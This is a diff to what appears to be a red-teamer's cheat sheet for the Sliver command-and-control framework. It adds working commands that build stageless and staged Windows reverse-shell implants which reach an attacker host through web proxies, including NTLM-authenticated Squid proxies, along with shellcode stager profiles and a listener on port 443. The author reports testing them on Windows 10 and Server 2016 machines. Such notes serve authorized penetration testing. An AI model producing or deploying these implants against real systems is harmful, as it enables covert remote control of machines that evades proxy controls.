@@ -228,7 +228,11 @@ Flags:
 
 [*] Successfully started job #1
 
-[server] sliver >  
+[server] sliver > jobs
+
+ ID   Name    Protocol   Port
+==== ======= ========== ======
+ 1    https   tcp        443
 
 
 =====================================================================================================================
@@ -298,17 +302,38 @@ Sub Commands:
 jeff@kali:~/Documents/Tools/SLiver-C2$ sudo chmod 777 SliverRevShell1.exe 
 
 
----------------------------------------------------------------------------
-Note - Commands to generate a SLIVER implant that goes through a Web proxy
----------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
+Notes - Commands to generate a SLIVER implant that goes through a Web proxy
+-----------------------------------------------------------------------------------------------
 
-Example 1 - Command using the "wininet" driver 
-> I tested it on a target Windows machine that was configured with an unauthenticated HTTP SQUID proxy set as the default Web proxy server
-> generate --arch amd64 -f exe --save /temp/SliverRevShell.exe --os Windows --http https://<IP or domain.com>?driver=wininet 
+Example 1 - SLIVER implants using the "wininet" driver 
+--------------------------------------------------------
+Tested (sucessfully) on a Windows 10 laptop and on a Windows server 2016 that were configured with:
++ test 1 - an unauthenticated HTTP SQUID proxy (set as the default Web proxy server in IE)
++ test 2 - an authenticated (NTLM authent) HTTP SQUID proxy (set as the default Web proxy server in IE)
 
-Example 2 - Command using the "Go HTTP" driver
-> I tested it on a target Windows machine that was configured with no Web proxy server
-> generate --arch amd64 -f exe --save /temp/SliverRevShell.exe --os Windows --http https://<IP or domain.com>?proxy=http://<proxy-IP>:<proxy-port>
+> Stageless SLIVER implant
+  - - - - - - - - - - - - -
+  [server] sliver > generate --arch amd64 -f exe --save /temp/SliverRevShell.exe --os Windows --http https://<IP or domain.com>?driver=wininet 
+
+> Staged SLIVER implant
+  - - - - - - - - - - -
+  [server] sliver > generate stager --lhost <IP or domain.com>?driver=wininet --format raw --lport 443 --protocol https --arch amd64
+
+> Staged & stageless SLIVER listener
+  - - - - - - - - - - -  - - - - - -
+  [server] sliver > profiles new --http <IP or domain.com>?driver=wininet --format shellcode --arch amd64 --os Windows -e TestStagerWininet
+  [server] sliver > stage-listener --url https://0.0.0.0:443 --profile TestStagerWininet
+
+
+Example 2 - SLIVER implants using the "Go HTTP" driver
+-------------------------------------------------------
+Tested (sucessfully) on a Windows 10 laptop that was configured with no Web proxy server. The Sliver traffic whent through the hardcoded proxy of the implant.
+
+> Stageless SLIVER implant
+  - - - - - - - - - - - - -
+  [server] sliver > generate --arch amd64 -f exe --save /temp/SliverRevShell.exe --os Windows --http https://<IP or domain.com>?proxy=http://<proxy-IP>:<proxy-port>
+
 
 URLs:
 - https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options
